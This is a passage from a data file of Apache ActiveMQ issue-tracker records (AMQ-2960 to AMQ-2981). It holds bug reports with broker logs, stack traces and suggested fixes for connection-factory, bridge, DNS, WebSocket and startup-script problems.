ID:xxxx-35451-1285948546531-0:0:1:1:10394[pblackburn@xxxx test]$Looking in the activemq log file, at around this point we see:2010-10-01 15:55:51 Queue [DEBUG] TEST_QUEUE toPageIn: 1, Inflight: 205, pagedInMessages.size 349, enqueueSize: 103902010-10-01 15:55:51 Queue [DEBUG] TEST_QUEUE toPageIn: 1, Inflight: 205, pagedInMessages.size 350, enqueueSize: 103912010-10-01 15:55:51 Queue [DEBUG] TEST_QUEUE toPageIn: 1, Inflight: 205, pagedInMessages.size 351, enqueueSize: 103922010-10-01 15:55:51 Queue [DEBUG] TEST_QUEUE toPageIn: 1, Inflight: 205, pagedInMessages.size 352, enqueueSize: 103932010-10-01 15:55:51 Usage [DEBUG] Main:memory:queue://TEST_QUEUE:memory: usage change from: 69% of available memory, to: 70% of available memory2010-10-01 15:55:51 Usage [DEBUG] Main:memory:queue://TEST_QUEUE:memory: usage change from: 70% of available memory, to: 69% of available memory2010-10-01 15:55:51 AbstractStoreCursor [DEBUG] TEST_QUEUE disabling cache on size:0, lastCachedIdSeq: 10398 current node seqId: 103992010-10-01 15:55:51 Usage [DEBUG] Main:memory:queue://TEST_QUEUE:memory: usage change from: 69% of available memory, to: 70% of available memory2010-10-01 15:55:51 Queue [DEBUG] TEST_QUEUE toPageIn: 2, Inflight: 353, pagedInMessages.size 353, enqueueSize: 103952010-10-01 15:55:51 Usage [DEBUG] Main:memory:queue://TEST_QUEUE:memory: usage change from: 70% of available memory, to: 69% of available memory2010-10-01 15:55:51 Usage [DEBUG] Main:memory:queue://TEST_QUEUE:memory: usage change from: 69% of available memory, to: 70% of available memoryAt the end of the log file, where we have a single message stuck on the queue, we see:2010-10-01 15:56:10 Queue [DEBUG] TEST_QUEUE toPageIn: 1, Inflight: 0, pagedInMessages.size 0, enqueueSize: 1000002010-10-01 15:56:10 Queue [DEBUG] TEST_QUEUE toPageIn: 1, Inflight: 0, pagedInMessages.size 0, enqueueSize: 1000002010-10-01 15:56:10 Queue [DEBUG] TEST_QUEUE toPageIn: 1, Inflight: 0, pagedInMessages.size 0, enqueueSize: 1000002010-10-01 15:56:10 Queue [DEBUG] TEST_QUEUE toPageIn: 1, Inflight: 0, pagedInMessages.size 0, enqueueSize: 1000002010-10-01 15:56:10 Queue [DEBUG] TEST_QUEUE toPageIn: 1, Inflight: 0, pagedInMessages.size 0, enqueueSize: 1000002010-10-01 15:56:10 Queue [DEBUG] TEST_QUEUE toPageIn: 1, Inflight: 0, pagedInMessages.size 0, enqueueSize: 100000We can see the checkpoint failing to clean up the log files:2010-10-01 15:56:36 MessageDatabase [DEBUG] Checkpoint started.2010-10-01 15:56:36 MessageDatabase [DEBUG] not removing data file: 2 as contained ack(s) refer to referenced file: [1, 2]2010-10-01 15:56:36 MessageDatabase [DEBUG] not removing data file: 3 as contained ack(s) refer to referenced file: [2, 3]2010-10-01 15:56:36 MessageDatabase [DEBUG] not removing data file: 4 as contained ack(s) refer to referenced file: [3, 4]2010-10-01 15:56:36 MessageDatabase [DEBUG] not removing data file: 5 as contained ack(s) refer to referenced file: [4, 5]2010-10-01 15:56:36 MessageDatabase [DEBUG] Checkpoint done.At this point our consumer had consumed all of the messages except the single stuck message.We are using a clean out of the box set up - we have made no changes to the default activemq.xml file,
issueID:AMQ-2960
type:Bug
changed files:PooledConnectionFactoryBean.java
texts:PooledConnectionFactoryBean returns null in OSGi env sometimes
From time to time PooledConnectionFactoryBean failed to initialize itself correctly in ServiceMix 4 (FUSE actually). From activemq-broker.xml:Exception in thread "SpringOsgiExtenderThread-20" org.springframework.beans.factory.BeanCreationException: Error creating bean with name "pooledConnectionFactory" defined in URL &#91;bundleentry://110.fwk173823/META-INF/spring/activemq-broker.xml&#93;: factory-bean "pooledConnectionFactoryFactory" returned null at org.springframework.beans.factory.support.ConstructorResolver.instantiateUsingFactoryMethod(ConstructorResolver.java:289) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.instantiateUsingFactoryMethod(AbstractAutowireCapableBeanFactory.java:903) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBeanInstance(AbstractAutowireCapableBeanFactory.java:817) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:440) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory$1.run(AbstractAutowireCapableBeanFactory.java:409) at java.security.AccessController.doPrivileged(Native Method) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:380) at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:264) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:261) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:185) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:164) at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:429) at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:728) at org.springframework.osgi.context.support.AbstractDelegatedExecutionApplicationContext.access$1600(AbstractDelegatedExecutionApplicationContext.java:69) at org.springframework.osgi.context.support.AbstractDelegatedExecutionApplicationContext$4.run(AbstractDelegatedExecutionApplicationContext.java:355) at org.springframework.osgi.util.internal.PrivilegedUtils.executeWithCustomTCCL(PrivilegedUtils.java:85) at org.springframework.osgi.context.support.AbstractDelegatedExecutionApplicationContext.completeRefresh(AbstractDelegatedExecutionApplicationContext.java:320) at org.springframework.osgi.extender.internal.dependencies.startup.DependencyWaiterApplicationContextExecutor$CompleteRefreshTask.run(DependencyWaiterApplicationContextExecutor.java:132) at java.lang.Thread.run(Thread.java:619)The problem is that Spring sometimes invokes @PreConstruct AFTER the getObject() has been used for dependent beans constructing. Therefore PooledConnectionFactoryBean.getObject() returns null.Lazy initialization is fixing this issue:    public Object getObject() throws Exception {        if (pooledConnectionFactory == null)        {            afterPropertiesSet();        }        return pooledConnectionFactory;    }
issueID:AMQ-2961
type:Improvement
changed files:
texts:Audit, test and update libraries in latest ActiveMQ distribution
Recommendation: Audit, test and update libraries in latest ActiveMQ distributionFor example:commons-logging-1.1 is now commons-logging-1.1.1; http://commons.apache.org/logging/download_logging.cgijaxb-api-2.1 has been updated to a newer version;  (https://jaxb.dev.java.net/)Not sure about jaxb-impl-2.1.6geronimo-jta_1.0.1B_spec-1.0.1 is now geronimo-jta_1.1_spec-1.1.1 as in the ServiceMix 3.3.2 release.etc.Thanks.
issueID:AMQ-2963
type:Bug
changed files:
texts:JMSBridgeConnectors does not work with IBM MQ and ActiveMQ 5.4.0
We are trying to create a bridge with IBM Websphere Queue and ActiveMQ queue. We have defined a broker in activemq.xml with following jmsBridgeConnectors information:<jmsBridgeConnectors>    <jmsQueueConnector      outboundQueueConnectionFactory="#remoteFactory">      <inboundQueueBridges>        <inboundQueueBridge inboundQueueName="IBM.TO.ACTIVEMQ" localQueueName="IBM.TO.ACTIVEMQ"/>      </inboundQueueBridges>   </jmsQueueConnector></jmsBridgeConnectors>We are getting below error with activemq 5.4.0 and it works fine with version 5.2.0:com.ibm.msg.client.jms.DetailedInvalidDestinationException: JMSCMQ0005: The destination name "://IBM.TO.ACTIVEMQ" was not valid. The destination name specified does not conform to published destination syntax. Correct the specified destination name and try again.        at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method)        at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:39)        at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:27)        at java.lang.reflect.Constructor.newInstance(Constructor.java:513)        at com.ibm.msg.client.commonservices.j2se.NLSServices.createException(NLSServices.java:313)        at com.ibm.msg.client.commonservices.nls.NLSServices.createException(NLSServices.java:388)        at com.ibm.msg.client.wmq.common.internal.WMQDestinationURIParser.setUri(WMQDestinationURIParser.java:524)        at com.ibm.msg.client.wmq.common.internal.WMQDestination.<init>(WMQDestination.java:3148)        at com.ibm.msg.client.wmq.common.internal.WMQDestination.<init>(WMQDestination.java:3104)        at com.ibm.msg.client.wmq.factories.WMQFactoryFactory.createProviderDestination(WMQFactoryFactory.java:444)        at com.ibm.msg.client.jms.admin.JmsDestinationImpl.setProviderDestination(JmsDestinationImpl.java:333)        at com.ibm.msg.client.jms.admin.JmsDestinationImpl.initialise(JmsDestinationImpl.java:231)        at com.ibm.msg.client.jms.admin.JmsDestinationImpl.<init>(JmsDestinationImpl.java:196)        at com.ibm.msg.client.jms.admin.JmsJndiDestinationImpl.<init>(JmsJndiDestinationImpl.java:129)        at com.ibm.mq.jms.MQDestination.<init>(MQDestination.java:186)        at com.ibm.msg.client.wmq.factories.admin.WMQJmsFactory.createDestination(WMQJmsFactory.java:125)        at com.ibm.msg.client.jms.internal.JmsMessageImpl.providerDestToJmsDest(JmsMessageImpl.java:2111)        at com.ibm.msg.client.jms.internal.JmsMessageImpl.getJMSDestination(JmsMessageImpl.java:686)        at com.ibm.jms.JMSMessage.getJMSDestination(JMSMessage.java:605)        at org.apache.activemq.ActiveMQMessageTransformation.copyProperties(ActiveMQMessageTransformation.java:206)        at org.apache.activemq.ActiveMQMessageTransformation.transformMessage(ActiveMQMessageTransformation.java:188)        at org.apache.activemq.ActiveMQSession.send(ActiveMQSession.java:1720)        at org.apache.activemq.ActiveMQMessageProducer.send(ActiveMQMessageProducer.java:231)        at org.apache.activemq.ActiveMQMessageProducerSupport.send(ActiveMQMessageProducerSupport.java:300)        at org.apache.activemq.ActiveMQQueueSender.send(ActiveMQQueueSender.java:111)        at org.apache.activemq.network.jms.QueueBridge.sendMessage(QueueBridge.java:80)        at org.apache.activemq.network.jms.DestinationBridge.onMessage(DestinationBridge.java:129)        at com.ibm.mq.jms.MQMessageConsumer$FacadeMessageListener.onMessage(MQMessageConsumer.java:399)        at com.ibm.msg.client.jms.internal.JmsMessageConsumerImpl$JmsProviderMessageListener.onMessage(JmsMessageConsumerImpl.java:904)        at com.ibm.msg.client.wmq.internal.WMQAsyncConsumerShadow.honourNoLocal(WMQAsyncConsumerShadow.java:550)        at com.ibm.msg.client.wmq.internal.WMQAsyncConsumerShadow.consumer(WMQAsyncConsumerShadow.java:384)        at com.ibm.mq.jmqi.remote.internal.RemoteAsyncConsume.driveConsumer(RemoteAsyncConsume.java:1478)        at com.ibm.mq.jmqi.remote.internal.RemoteDispatchThread.run(RemoteDispatchThread.java:385)        at com.ibm.msg.client.commonservices.workqueue.WorkQueueItem.runTask(WorkQueueItem.java:209)        at com.ibm.msg.client.commonservices.workqueue.SimpleWorkQueueItem.runItem(SimpleWorkQueueItem.java:100)        at com.ibm.msg.client.commonservices.workqueue.WorkQueueItem.run(WorkQueueItem.java:224)        at com.ibm.msg.client.commonservices.workqueue.WorkQueueManager.runWorkQueueItem(WorkQueueManager.java:298)        at com.ibm.msg.client.commonservices.j2se.workqueue.WorkQueueManagerImplementation$ThreadPoolWorker.run(WorkQueueManagerImplementation.java:1220)I looked at the code for class ActiveMQsession has a method send which was modified after v 5.2.0 and below lines of code were moved before transforming the IBM JMS Message to Active MQ message:            message.setJMSDestination(destination);            message.setJMSDeliveryMode(deliveryMode);            long expiration = 0L;            if (!producer.getDisableMessageTimestamp()) {                long timeStamp = System.currentTimeMillis();                message.setJMSTimestamp(timeStamp);                if (timeToLive > 0) {                    expiration = timeToLive + timeStamp;                }            }            message.setJMSExpiration(expiration);            message.setJMSPriority(priority);            message.setJMSRedelivered(false);Now code sets the ActiveMQDestination as the JMS destination to IBM Message before transformation and we are getting above error when JMS properties are getting copied from IBM Message to ActiveMQMessage inside ActiveMQMessageTransformation.
issueID:AMQ-2965
type:Bug
changed files:TcpTransport.java
TcpTransportServer.java
BrokerService.java
RegionBroker.java
IdGenerator.java
InetAddressUtil.java
UdpTransport.java
texts:ActiveMQ fails to start if no DNS resolution for hostname is available
ActiveMQ is installed on a physical server with two ethernet interfaces &#8211; the first is a 10.x.x.x network and used only for external traffic , the second interface is a 172.x.x.x network and is used only for internal (intra-cluster node) communication. ActiveMQ is configured to listen only on the 172.x.x.x interface. External DNS resolution exists but internal DNS resolution does not. While each host has a unique name, none of these names are resolvable. Under these circumstances, ActiveMQ fails to start up successfully. Below are the exceptions and stack trace: 2010-06-09 16:48:45,714 | ERROR | Failed to resolve localhost | org.apache.activemq.broker.BrokerService | WrapperSimpleAppMain 2010-06-09 16:48:46,092 | INFO | Using Persistence Adapter: org.apache.activemq.store.kahadb.KahaDBPersistenceAdapter@47c297a3 | org.apache.activemq.broker.BrokerService | WrapperSimpleAppMain 2010-06-09 16:48:46,928 | INFO | JMX consoles can connect to service:jmx:rmi://localhost:11616/jndi/rmi://localhost:1616/jmxrmi | org.apache.activemq.broker.jmx.ManagementContext | JMX connector 2010-06-09 16:48:47,036 | INFO | ActiveMQ 5.3.2 JMS Message Broker (Q01M0003) is starting | org.apache.activemq.broker.BrokerService | WrapperSimpleAppMain 2010-06-09 16:48:47,036 | INFO | For help or more information please see: http://activemq.apache.org/ | org.apache.activemq.broker.BrokerService | WrapperSimpleAppMain 2010-06-09 16:48:47,280 | WARN | could not generate unique stub | org.apache.activemq.util.IdGenerator | WrapperSimpleAppMain java.net.UnknownHostException: Q01M0003: Q01M0003         at java.net.InetAddress.getLocalHost(Unknown Source)         at org.apache.activemq.util.IdGenerator.&lt;clinit&gt;(IdGenerator.java:52)         at org.apache.activemq.broker.region.RegionBroker.&lt;clinit&gt;(RegionBroker.java:75)         at org.apache.activemq.broker.BrokerService.createRegionBroker(BrokerService.java:1734)         at org.apache.activemq.broker.BrokerService.createRegionBroker(BrokerService.java:1728)         at org.apache.activemq.broker.BrokerService.createBroker(BrokerService.java:1688)         at org.apache.activemq.broker.BrokerService.getBroker(BrokerService.java:706)         at org.apache.activemq.broker.BrokerService.start(BrokerService.java:469)         at org.apache.activemq.xbean.XBeanBrokerService.afterPropertiesSet(XBeanBrokerService.java:85)         at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)         at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source)         at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)         at java.lang.reflect.Method.invoke(Unknown Source)         at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeCustomInitMethod(AbstractAutowireCapableBeanFactory.java:1414)         at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeInitMethods(AbstractAutowireCapableBeanFactory.java:1375)         at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1335)         at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:473)         at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory$1.run(AbstractAutowireCapableBeanFactory.java:409)         at java.security.AccessController.doPrivileged(Native Method)         at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:380)         at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:264)         at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222)         at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:261)         at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:185)         at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:164)         at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:429)         at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:728)         at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:380)         at org.apache.xbean.spring.context.ResourceXmlApplicationContext.&lt;init&gt;(ResourceXmlApplicationContext.java:64)         at org.apache.xbean.spring.context.ResourceXmlApplicationContext.&lt;init&gt;(ResourceXmlApplicationContext.java:52)         at org.apache.activemq.xbean.XBeanBrokerFactory.createApplicationContext(XBeanBrokerFactory.java:96)         at org.apache.activemq.xbean.XBeanBrokerFactory.createBroker(XBeanBrokerFactory.java:52)         at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:71)         at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:54)         at org.apache.activemq.console.command.StartCommand.startBroker(StartCommand.java:115)         at org.apache.activemq.console.command.StartCommand.runTask(StartCommand.java:74)         at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)         at org.apache.activemq.console.command.ShellCommand.runTask(ShellCommand.java:136)         at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)         at org.apache.activemq.console.command.ShellCommand.main(ShellCommand.java:82)         at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)         at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source)         at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)         at java.lang.reflect.Method.invoke(Unknown Source)         at org.apache.activemq.console.Main.runTaskClass(Main.java:251)         at org.apache.activemq.console.Main.main(Main.java:107)         at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)         at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source)         at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)         at java.lang.reflect.Method.invoke(Unknown Source)         at org.tanukisoftware.wrapper.WrapperSimpleApp.run(WrapperSimpleApp.java:240)         at java.lang.Thread.run(Unknown Source) 2010-06-09 16:48:47,407 | ERROR | Failed to start ActiveMQ JMS Message Broker. Reason: java.io.IOException: Transport Connector could not be registered in JMX: Q01M0003: Q01M0003 | org.apache.activemq.broker.BrokerService | WrapperSimpleAppMain java.io.IOException: Transport Connector could not be registered in JMX: Q01M0003: Q01M0003         at org.apache.activemq.util.IOExceptionSupport.create(IOExceptionSupport.java:27)         at org.apache.activemq.broker.BrokerService.registerConnectorMBean(BrokerService.java:1585)         at org.apache.activemq.broker.BrokerService.startTransportConnector(BrokerService.java:2006)         at org.apache.activemq.broker.BrokerService.startAllConnectors(BrokerService.java:1959)         at org.apache.activemq.broker.BrokerService.start(BrokerService.java:491)         at org.apache.activemq.xbean.XBeanBrokerService.afterPropertiesSet(XBeanBrokerService.java:85)         at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)         at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source)         at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)         at java.lang.reflect.Method.invoke(Unknown Source)         at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeCustomInitMethod(AbstractAutowireCapableBeanFactory.java:1414)         at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeInitMethods(AbstractAutowireCapableBeanFactory.java:1375)         at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1335)         at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:473)         at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory$1.run(AbstractAutowireCapableBeanFactory.java:409)         at java.security.AccessController.doPrivileged(Native Method)         at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:380)         at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:264)         at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222)         at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:261)         at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:185)         at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:164)         at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:429)         at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:728)         at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:380)         at org.apache.xbean.spring.context.ResourceXmlApplicationContext.&lt;init&gt;(ResourceXmlApplicationContext.java:64)         at org.apache.xbean.spring.context.ResourceXmlApplicationContext.&lt;init&gt;(ResourceXmlApplicationContext.java:52)         at org.apache.activemq.xbean.XBeanBrokerFactory.createApplicationContext(XBeanBrokerFactory.java:96)         at org.apache.activemq.xbean.XBeanBrokerFactory.createBroker(XBeanBrokerFactory.java:52)         at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:71)         at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:54)         at org.apache.activemq.console.command.StartCommand.startBroker(StartCommand.java:115)         at org.apache.activemq.console.command.StartCommand.runTask(StartCommand.java:74)         at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)         at org.apache.activemq.console.command.ShellCommand.runTask(ShellCommand.java:136)         at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)         at org.apache.activemq.console.command.ShellCommand.main(ShellCommand.java:82)         at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)         at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source)         at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)         at java.lang.reflect.Method.invoke(Unknown Source)         at org.apache.activemq.console.Main.runTaskClass(Main.java:251)         at org.apache.activemq.console.Main.main(Main.java:107)         at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)         at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source)         at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)         at java.lang.reflect.Method.invoke(Unknown Source)         at org.tanukisoftware.wrapper.WrapperSimpleApp.run(WrapperSimpleApp.java:240)         at java.lang.Thread.run(Unknown Source) Caused by: java.net.UnknownHostException: Q01M0003: Q01M0003         at java.net.InetAddress.getLocalHost(Unknown Source)         at org.apache.activemq.transport.tcp.TcpTransportServer.resolveHostName(TcpTransportServer.java:336)         at org.apache.activemq.transport.tcp.TcpTransportServer.bind(TcpTransportServer.java:142)         at org.apache.activemq.transport.tcp.TcpTransportFactory.doBind(TcpTransportFactory.java:60)         at org.apache.activemq.transport.TransportFactory.bind(TransportFactory.java:131)         at org.apache.activemq.broker.TransportConnector.createTransportServer(TransportConnector.java:305)         at org.apache.activemq.broker.TransportConnector.getServer(TransportConnector.java:137)         at org.apache.activemq.broker.TransportConnector.asManagedConnector(TransportConnector.java:100)         at org.apache.activemq.broker.BrokerService.registerConnectorMBean(BrokerService.java:1580)         ... 47 more 2010-06-09 16:48:47,409 | INFO | ActiveMQ Message Broker (Q01M0003, null) is shutting down | org.apache.activemq.broker.BrokerService | WrapperSimpleAppMain 2010-06-09 16:48:47,410 | INFO | Connector openwire Stopped | org.apache.activemq.broker.TransportConnector | WrapperSimpleAppMain 2010-06-09 16:48:47,535 | INFO | ActiveMQ JMS Message Broker (Q01M0003, null) stopped | org.apache.activemq.broker.BrokerService | WrapperSimpleAppMain This problem can be worked around by adding an entry to the /etc/hosts file for each machine. Unfortunately this presents quite a maintenance nightmare in a very large environment.
issueID:AMQ-2966
type:Bug
changed files:
texts:Null messages occurring when using VM transport, topics and multiple consumers
introduced by fix for https://issues.apache.org/activemq/browse/AMQ-2103contention on marshaling message received over vm transport for the first time causes potential null. With multiple topic consumers there is contention as the message has not been unmarshalled on dispatch to the topic due to the vm transport being used.moving the set to null out of the beforeMarahallMessage removes the potential sync window that causes the problem.
issueID:AMQ-2967
type:Bug
changed files:
texts:Have Schedular support disabled by default
This feature should be enabled by config, as it creates a new store and some threads at startup, they should only be created when required.related: https://issues.apache.org/activemq/browse/AMQ-2959
issueID:AMQ-2968
type:Improvement
changed files:NOTICE
pom.xml
ActiveMQLauncher.java
texts:Add Apache commons daemon (jsvc/procrun) start/stop support.
This JIRA is for adding support to use Apache commons daemon support to ActiveMQ.http://commons.apache.org/daemon/jsvc.htmlhttp://blog.bigrocksoftware.com/2010/10/07/commons-daemon-procrun-as-a-java-service-wrapper-for-activemq/
issueID:AMQ-2970
type:Bug
changed files:BrokerView.java
BrokerService.java
QueueView.java
BrokerSupport.java
texts:Fire advisory events when destinations are created/delete via JMX
Currently these operations don"t trigger advisory events.
issueID:AMQ-2971
type:Bug
changed files:DestinationStatistics.java
texts:DestinationStatistics.getMessages() returns 0 after reset with messages still in queue
A call to org.apache.activemq.broker.jmx.DestinationView.resetStatistics() is implemented as a call to org.apache.activemq.broker.region.DestinationStatistics.reset(). This call sets the DestinationStatistics.messages counter to 0 even if there are messages currently in the queue.This is functionally the same issue that was resolved for the "producers" and "consumers" counters in AMQ-1946.The fix should be as easy as setting the doReset to false for the messages counter.messages.setDoReset(false);
issueID:AMQ-2972
type:Bug
changed files:
texts:STOMP over Websockets do not work in Chrome
The STOMP over Websocket support does not work with both client libraries referenced from the ActiveMQ Websockets page( http://activemq.apache.org/websockets.html ).On the ActiveMQ side, the following error appears: INFO | Started SelectChannelConnector@0.0.0.0:8161ERROR | handle failed?java.lang.IllegalArgumentException: !utf8        at org.eclipse.jetty.util.Utf8StringBuilder.append(Utf8StringBuilder.java:112)        at org.eclipse.jetty.websocket.WebSocketParser.parseNext(WebSocketParser.java:147)        at org.eclipse.jetty.websocket.WebSocketConnection.handle(WebSocketConnection.java:75)        at org.eclipse.jetty.server.bio.SocketConnector$ConnectorEndPoint.run(SocketConnector.java:252)        at org.eclipse.jetty.util.thread.QueuedThreadPool$2.run(QueuedThreadPool.java:436)        at java.lang.Thread.run(Unknown Source)
issueID:AMQ-2973
type:Bug
changed files:
texts:Removing composite subscription clears all dispatched messages
When removing subscription on a composite destination, the removal of the first destination dispatched messages will clear the list, so subsequent destinations won"t redeliver their messages.
issueID:AMQ-2975
type:Bug
changed files:BrowseCommand.java
BstatCommand.java
activemq
ShutdownCommand.java
AbstractJmxCommand.java
QueryCommand.java
PurgeCommand.java
ListCommand.java
texts:New shell scripts doesn&#39;t work well with multiple broker instances
1) Create the instances:$ cd /home/phil/apache-activemq-5.4.1$ bin/activemq create broker1$ bin/activemq setup ~/.activemqrc-instance-broker1$ ln -s activemq bin/activemq-instance-broker1$ bin/activemq create broker2$ bin/activemq setup ~/.activemqrc-instance-broker2$ ln -s activemq bin/activemq-instance-broker22) set unique ports for the instances in their conf/activemq.xml and conf/jetty.xml files as shown below:$ grep 16  broker&#91;12&#93;/conf/*.xmlbroker1/conf/activemq.xml:            <transportConnector name="openwire" uri="tcp://0.0.0.0:61616"/>broker1/conf/jetty.xml:                    <property name="port" value="8161" />broker2/conf/activemq.xml:            <transportConnector name="openwire" uri="tcp://0.0.0.0:61626"/>broker2/conf/jetty.xml:                    <property name="port" value="8162" />When I try to start both brokers, I get a "Process with pid XXX is already running" message.  This is due to the pid file being created in $ACTIVEMQ_HOME/data rather than the instance"s $ACTIVEMQ_BASE/data directory
issueID:AMQ-2980
type:Bug
changed files:
texts:Seeing inflight messages that are not consumed when jmsPriority is enabled and have intermittent durable consumer
With reconnecting durable subs or with small prefetch, out of order priority messages and missing messages can occur. Issues with the kahaDB topic store, message delete and ordered cursor sync and replay.Topic store sd.orderIndex need an exclusive lock and replay from the last ack needs to take ordered cursors into account. Batch replay also needs to maintain ordered cursor state between batches.JDBC store also has some issues in the batch regard.
issueID:AMQ-2981
type:Bug
changed files:
texts:Connecting to broker using discovery protocol fails
steps to reproduce1. have a broker running on a port say "12345" and group say "test" using activemq-core version 5.4.0 or 5.4.12.  use url discovery:(multicast://default?group=test)?reconnectDelay=1000&maxReconnectAttempts=30&useExponentialBackOff=false to connect to the broker3. the following exception occursCaused by: javax.jms.JMSException: Invalid connect parameters: {reconnectDelay=1000, maxReconnectAttempts=30, useExponentialBackOff=false} at org.apache.activemq.util.JMSExceptionSupport.create(JMSExceptionSupport.java:62) at org.apache.activemq.ActiveMQConnection.syncSendPacket(ActiveMQConnection.java:1298) at org.apache.activemq.ActiveMQConnection.ensureConnectionInfoSent(ActiveMQConnection.java:1382) at org.apache.activemq.ActiveMQConnection.createSession(ActiveMQConnection.java:309) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25) at org.springframework.jms.connection.SingleConnectionFactory$SharedConnectionInvocationHandler.invoke(SingleConnectionFactory.java:550) at $Proxy34.createSession(Unknown Source) at org.springframework.jms.support.JmsAccessor.createSession(JmsAccessor.java:196) at org.springframework.jms.core.JmsTemplate.execute(JmsTemplate.java:457) ... 38 moreCaused by: java.io.IOException: Invalid connect parameters: {reconnectDelay=1000, maxReconnectAttempts=30, useExponentialBackOff=false} at org.apache.activemq.util.IOExceptionSupport.create(IOExceptionSupport.java:45) at org.apache.activemq.transport.failover.FailoverTransport.oneway(FailoverTransport.java:594) at org.apache.activemq.transport.TransportFilter.oneway(TransportFilter.java:85) at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:40) at org.apache.activemq.transport.ResponseCorrelator.asyncRequest(ResponseCorrelator.java:81) at org.apache.activemq.transport.ResponseCorrelator.request(ResponseCorrelator.java:86) at org.apache.activemq.ActiveMQConnection.syncSendPacket(ActiveMQConnection.java:1276) ... 48 moreCaused by: java.lang.IllegalArgumentException: Invalid connect parameters: {reconnectDelay=1000, 